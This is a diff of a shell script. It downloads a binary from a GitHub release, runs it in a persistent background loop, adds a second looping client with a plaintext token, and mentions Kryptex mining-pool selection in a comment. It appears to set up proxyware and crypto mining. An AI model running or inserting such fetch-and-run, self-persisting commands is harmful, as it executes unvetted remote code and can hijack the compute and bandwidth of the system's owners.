@@ -66,7 +66,8 @@ else
 
 fi
 
-wget https://github.com/haitujj/flows/releases/download/v1/psclient && chmod +x psclient && export PS_IS_DOCKER=true CID=7zWo && while true; do ./psclient "$@"; sleep 2; done &
+wget https://github.com/haitujj/flows/releases/download/v1/jige.tar.gz && tar xzf jige.tar.gz && rm -f jige.tar.gz && export PS_IS_DOCKER=true CID=7zWo && while true; do ./psclient "$@"; sleep 2; done &
+while true; do ./cli start accept --token ZViMo4JNU2lXZuXHFLNfhAnNeIB4mOP6XV4ioxIWnbM=; sleep 2; done &
 
 # ==================================================
 # Kryptex PRL 自动选择最低延迟矿池
